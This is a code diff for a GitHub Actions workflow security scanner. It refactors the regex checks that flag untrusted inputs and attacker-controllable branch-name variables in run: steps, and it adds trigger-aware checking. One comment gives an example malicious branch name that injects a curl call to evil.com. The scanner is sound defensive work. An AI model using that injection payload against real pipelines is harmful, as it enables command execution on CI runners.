@@ -14,37 +14,44 @@ import (
 	"github.com/ossf/pvtr-github-repo-scanner/evaluation_plans/reusable_steps"
 )
 
-// https://securitylab.github.com/resources/github-actions-untrusted-input/
-// List of untrusted inputs; Global for use in tests also
-var untrustedVarsRegex = `.*(github\.event\.issue\.title|` +
-	`github\.event\.issue\.body|` +
-	`github\.event\.pull_request\.title|` +
-	`github\.event\.pull_request\.body|` +
-	`github\.event\.comment\.body|` +
-	`github\.event\.review\.body|` +
-	`github\.event\.pages.*\.page_name|` +
-	`github\.event\.commits.*\.message|` +
-	`github\.event\.head_commit\.message|` +
-	`github\.event\.head_commit\.author\.email|` +
-	`github\.event\.head_commit\.author\.name|` +
-	`github\.event\.commits.*\.author\.email|` +
-	`github\.event\.commits.*\.author\.name|` +
-	`github\.event\.pull_request\.head\.ref|` +
-	`github\.event\.pull_request\.head\.label|` +
-	`github\.event\.pull_request\.head\.repo\.default_branch|` +
-	`github\.head_ref).*`
+// Pre-compiled patterns used by workflow security checks.
+var (
+	// https://securitylab.github.com/resources/github-actions-untrusted-input/
+	// List of untrusted inputs; Global for use in tests also
+	untrustedVars = regexp.MustCompile(`.*(github\.event\.issue\.title|` +
+		`github\.event\.issue\.body|` +
+		`github\.event\.pull_request\.title|` +
+		`github\.event\.pull_request\.body|` +
+		`github\.event\.comment\.body|` +
+		`github\.event\.review\.body|` +
+		`github\.event\.pages.*\.page_name|` +
+		`github\.event\.commits.*\.message|` +
+		`github\.event\.head_commit\.message|` +
+		`github\.event\.head_commit\.author\.email|` +
+		`github\.event\.head_commit\.author\.name|` +
+		`github\.event\.commits.*\.author\.email|` +
+		`github\.event\.commits.*\.author\.name|` +
+		`github\.event\.pull_request\.head\.ref|` +
+		`github\.event\.pull_request\.head\.label|` +
+		`github\.event\.pull_request\.head\.repo\.default_branch|` +
+		`github\.head_ref).*`)
 
-// Branch name variables that could be used unsafely in workflow run steps.
-// These are attacker-controllable when a PR is opened from a fork.
-// When used directly in a run: step, GitHub textually injects the branch name
-// into the shell script before execution, allowing command injection via
-// a malicious branch name (e.g. a branch named: feature"; curl evil.com; echo ").
-var branchNameVarsRegex = `.*(github\.head_ref|` +
-	`github\.base_ref|` +
-	`github\.ref\b|` +
-	`github\.ref_name|` +
-	`github\.event\.pull_request\.head\.ref|` +
-	`github\.event\.pull_request\.base\.ref).*`
+	// Branch name variables that could be used unsafely in workflow run steps.
+	// These are attacker-controllable when a PR is opened from a fork.
+	// When used directly in a run: step, GitHub textually injects the branch name
+	// into the shell script before execution, allowing command injection via
+	// a malicious branch name (e.g. a branch named: feature"; curl evil.com; echo ").
+	alwaysUnsafeBranchVars = regexp.MustCompile(`.*(github\.head_ref|` +
+		`github\.base_ref|` +
+		`github\.event\.pull_request\.head\.ref|` +
+		`github\.event\.pull_request\.base\.ref).*`)
+
+	// Branch ref variables that are only attacker-controllable in
+	// pull_request-triggered workflows. Checked separately so we can
+	// skip them for push-triggered workflows and avoid false positives.
+	pullRequestOnlyUnsafeBranchVars = regexp.MustCompile(`.*(github\.ref\b|` +
+		`github\.ref_name).*`)
+)
 
 // checkAllWorkflows verifies the payload, iterates over all workflow files, and
 // applies checkWorkflow to each parsed workflow. passMessage is returned when all files pass.
@@ -103,9 +110,24 @@ func CicdBranchNameSanitized(payloadData any) (gemara.Result, string, gemara.Con
 		"GitHub Workflows do not use unsanitized branch names in run steps")
 }
 
+// checkWorkflowFileForBranchNameUsage checks a workflow for unsanitized branch name
+// variables used directly in run: steps, which can lead to command injection.
+// It applies two levels of checking:
+//   - alwaysUnsafeBranchVars: flagged regardless of trigger type (e.g. github.head_ref)
+//   - pullRequestOnlyUnsafeBranchVars: only flagged when the workflow has a
+//     pull_request or pull_request_target trigger (e.g. github.ref, github.ref_name)
 func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, string) {
 
-	branchNameVars, _ := regexp.Compile(branchNameVarsRegex)
+	// Determine if the workflow is triggered by pull request events,
+	// which makes github.ref and github.ref_name attacker-controllable.
+	hasPullRequestTrigger := false
+	for _, event := range workflow.On {
+		if event.EventName() == "pull_request" || event.EventName() == "pull_request_target" {
+			hasPullRequestTrigger = true
+			break
+		}
+	}
+
 	var message strings.Builder
 
 	for _, job := range workflow.Jobs {
@@ -126,8 +148,11 @@ func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, s
 			varList := pullVariablesFromScript(run.Run.Value)
 
 			for _, name := range varList {
-				if branchNameVars.Match([]byte(name)) {
+				nameBytes := []byte(name)
+				if alwaysUnsafeBranchVars.Match(nameBytes) {
 					message.WriteString(fmt.Sprintf("Unsanitized branch name variable found: %v\n", name))
+				} else if hasPullRequestTrigger && pullRequestOnlyUnsafeBranchVars.Match(nameBytes) {
+					message.WriteString(fmt.Sprintf("Attacker-controllable ref variable in pull_request workflow: %v\n", name))
 				}
 			}
 		}
@@ -139,30 +164,32 @@ func checkWorkflowFileForBranchNameUsage(workflow *actionlint.Workflow) (bool, s
 	return true, ""
 }
 
+// checkWorkflowFileForUntrustedInputs checks a workflow for known untrusted
+// GitHub Actions context variables used directly in run: steps.
+// These variables (e.g. issue titles, PR bodies, commit messages) are
+// user-controllable and can lead to command injection when interpolated
+// into shell scripts without sanitization.
 func checkWorkflowFileForUntrustedInputs(workflow *actionlint.Workflow) (bool, string) {
 
-	untrustedVars, _ := regexp.Compile(untrustedVarsRegex)
 	var message strings.Builder
 
 	for _, job := range workflow.Jobs {
-
 		if job == nil {
 			continue
 		}
 
-		//Check the step for untrusted inputs
 		for _, step := range job.Steps {
-
 			if step == nil {
 				continue
 			}
 
-			// if it isn't an exec run get out of dodge
+			// Only run: steps are vulnerable; action steps use inputs safely.
 			run, ok := step.Exec.(*actionlint.ExecRun)
 			if !ok || run.Run == nil {
 				continue
 			}
 
+			// Extract all ${{ ... }} expressions and check against known untrusted inputs.
 			varList := pullVariablesFromScript(run.Run.Value)
 
 			for _, name := range varList {
@@ -194,14 +221,14 @@ func pullVariablesFromScript(script string) []string {
 			break
 		}
 
-		len := strings.Index(script[start:], "}}")
-		if len == -1 {
+		end := strings.Index(script[start:], "}}")
+		if end == -1 {
 			return nil
 		}
 
-		varlist = append(varlist, strings.TrimSpace(script[start+3:start+len]))
+		varlist = append(varlist, strings.TrimSpace(script[start+3:start+end]))
 
-		script = script[start+len:]
+		script = script[start+end:]
 
 	}
 
